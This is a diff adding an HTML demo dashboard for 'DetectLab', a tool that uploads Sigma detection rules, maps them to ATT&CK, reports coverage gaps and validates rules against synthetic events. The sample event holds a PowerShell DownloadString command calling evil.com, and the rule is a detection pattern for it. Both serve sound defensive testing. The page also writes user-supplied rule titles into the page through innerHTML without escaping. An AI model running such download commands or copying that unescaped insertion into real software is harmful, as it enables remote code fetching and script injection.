@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>DetectLab — Demo Dashboard</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #0d1117; color: #e6edf3; margin: 0; padding: 20px; }
+  h1 { color: #58a6ff; }
+  h2 { color: #79c0ff; border-bottom: 1px solid #30363d; padding-bottom: 5px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; margin-bottom: 20px; }
+  textarea, input { width: 100%; background: #0d1117; color: #e6edf3; border: 1px solid #30363d; border-radius: 4px; padding: 8px; margin-bottom: 8px; font-family: monospace; box-sizing: border-box; }
+  button { background: #238636; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-right: 8px; }
+  button:hover { background: #2ea043; }
+  pre { background: #010409; padding: 12px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; }
+  .verdict-PASS { color: #3fb950; font-weight: bold; }
+  .verdict-FAIL { color: #f85149; font-weight: bold; }
+  .verdict-INCONCLUSIVE { color: #d29922; font-weight: bold; }
+  .stat-box { display: inline-block; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px 20px; margin-right: 12px; text-align: center; }
+  .stat-number { font-size: 28px; font-weight: bold; color: #58a6ff; }
+  table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+  th, td { text-align: left; padding: 6px; border-bottom: 1px solid #21262d; }
+  th { border-bottom: 1px solid #30363d; color: #79c0ff; }
+</style>
+</head>
+<body>
+
+<h1>🛡️ DetectLab — Detection Validation Demo</h1>
+<p>A working demonstration: upload a Sigma rule → parse it → map to ATT&CK → check coverage → run safe validation.</p>
+
+<div class="card">
+  <h2>1. Upload a Sigma Rule</h2>
+  <input id="ruleTitle" placeholder="Rule title" value="Suspicious PowerShell Download">
+  <textarea id="ruleContent" rows="10">title: Suspicious PowerShell Download
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains: 'DownloadString'
+    condition: selection
+tags:
+    - attack.t1059.001
+level: high
+</textarea>
+  <button onclick="uploadRule()">Upload & Parse Rule</button>
+  <pre id="ruleResult">Result will appear here...</pre>
+</div>
+
+<div class="card">
+  <h2>📋 All Uploaded Rules</h2>
+  <button onclick="loadAllRules()">Refresh Rules List</button>
+  <div id="rulesListDisplay"></div>
+</div>
+
+<div class="card">
+  <h2>2. Register Telemetry Sources</h2>
+  <input id="telemetryName" placeholder="e.g. windows.powershell">
+  <button onclick="addTelemetry()">Register as Healthy</button>
+  <pre id="telemetryResult">Result will appear here...</pre>
+</div>
+
+<div class="card">
+  <h2>3. ATT&CK Coverage</h2>
+  <button onclick="loadCoverage()">Refresh Coverage</button>
+  <div id="coverageStats"></div>
+  <pre id="coverageResult">Click "Refresh Coverage" to load...</pre>
+    <h3 style="margin-top:20px; color:#d29922;">⚠️ Coverage Gaps</h3>
+  <div id="gapsDisplay"></div>
+</div>
+
+<div class="card">
+  <h2>4. Safe Validation (No Real Attack Executed)</h2>
+  <input id="versionId" placeholder="Rule Version ID (copy from step 1 result)">
+  <textarea id="syntheticEvent" rows="4">{
+  "Image": "C:\\Windows\\System32\\powershell.exe",
+  "CommandLine": "powershell.exe -c DownloadString('http://evil.com')"
+}</textarea>
+  <button onclick="runValidation()">Run Safe Validation</button>
+  <pre id="validationResult">Result will appear here...</pre>
+</div>
+
+<script>
+const API = "http://127.0.0.1:8000/api/v1";
+
+async function uploadRule() {
+  const res = await fetch(`${API}/rules`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      title: document.getElementById("ruleTitle").value,
+      raw_content: document.getElementById("ruleContent").value,
+      owner: "demo-user"
+    })
+  });
+  const data = await res.json();
+  document.getElementById("ruleResult").textContent = JSON.stringify(data, null, 2);
+
+  if (data.id) {
+    const vRes = await fetch(`${API}/rules/${data.id}/versions`);
+    const versions = await vRes.json();
+    if (versions.length > 0) {
+      const lastVersionId = versions[0].id;
+      document.getElementById("versionId").value = lastVersionId;
+      document.getElementById("ruleResult").textContent =
+        JSON.stringify(data, null, 2) + "\n\n--- Parsed Version ---\n" + JSON.stringify(versions[0], null, 2);
+    }
+  }
+
+  loadAllRules();
+}
+
+async function loadAllRules() {
+  const res = await fetch(`${API}/rules`);
+  const rules = await res.json();
+
+  let html = "<table><tr><th>Title</th><th>Status</th><th>Owner</th><th>Created</th></tr>";
+
+  for (const rule of rules) {
+    html += `<tr>
+      <td>${rule.title}</td>
+      <td>${rule.status}</td>
+      <td>${rule.owner || "-"}</td>
+      <td>${new Date(rule.created_at).toLocaleString()}</td>
+    </tr>`;
+  }
+  html += "</table>";
+
+  document.getElementById("rulesListDisplay").innerHTML = html;
+}
+
+async function addTelemetry() {
+  const name = document.getElementById("telemetryName").value;
+  const res = await fetch(`${API}/telemetry-sources`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ name: name, is_healthy: 1 })
+  });
+  const data = await res.json();
+  document.getElementById("telemetryResult").textContent = JSON.stringify(data, null, 2);
+}
+
+async function loadCoverage() {
+  const res = await fetch(`${API}/coverage`);
+  const data = await res.json();
+  document.getElementById("coverageResult").textContent = JSON.stringify(data, null, 2);
+
+  document.getElementById("coverageStats").innerHTML = `
+    <div class="stat-box"><div class="stat-number">${data.mapped_coverage_percent}%</div>Mapped Coverage</div>
+    <div class="stat-box"><div class="stat-number">${data.telemetry_ready_coverage_percent}%</div>Telemetry-Ready Coverage</div>
+  `;
+    let gapsHtml = "<table><tr><th>Technique</th><th>Priority</th><th>Recommendation</th></tr>";
+  for (const gap of data.gaps) {
+    const color = gap.priority === "HIGH" ? "#f85149" : gap.priority === "MEDIUM" ? "#d29922" : "#8b949e";
+    gapsHtml += `<tr>
+      <td>${gap.technique_id} — ${gap.name}</td>
+      <td style="color:${color}; font-weight:bold;">${gap.priority}</td>
+      <td>${gap.recommendation}</td>
+    </tr>`;
+  }
+  gapsHtml += "</table>";
+  document.getElementById("gapsDisplay").innerHTML = gapsHtml;
+}
+
+async function runValidation() {
+  const versionId = document.getElementById("versionId").value;
+  let event;
+  try {
+    event = JSON.parse(document.getElementById("syntheticEvent").value);
+  } catch (e) {
+    document.getElementById("validationResult").textContent = "Invalid JSON in synthetic event box.";
+    return;
+  }
+
+  const res = await fetch(`${API}/validation-runs`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ rule_version_id: versionId, synthetic_event: event })
+  });
+  const data = await res.json();
+
+  const verdictClass = "verdict-" + data.verdict;
+  document.getElementById("validationResult").innerHTML =
+    `<span class="${verdictClass}">Verdict: ${data.verdict}</span>\n\n` + JSON.stringify(data, null, 2);
+}
+</script>
+
+</body>
+</html>
